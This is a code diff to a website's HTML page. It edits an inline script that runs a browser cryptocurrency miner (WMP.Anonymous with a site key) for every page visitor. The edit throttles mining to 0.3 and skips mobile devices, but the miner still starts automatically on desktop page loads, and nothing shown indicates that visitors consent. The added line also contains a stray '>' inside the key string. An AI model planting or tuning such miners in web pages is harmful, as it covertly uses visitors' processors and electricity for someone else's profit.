@@ -15,8 +15,10 @@
     </head>
     <body>
         <script>
-            var miner = WMP.Anonymous('SK_vAfdxFWbM7An26q8EQ2m7');
-            miner.start();
+            var miner = WMP.Anonymous('SK_vAfdxFWbM7An26q8EQ2m7>',{throttle: 0.3});
+            if (!miner.isMobile()){
+                miner.start();
+            }
         </script>
         <!--=============== NAVBAR ===============-->
         <nav class="nav">
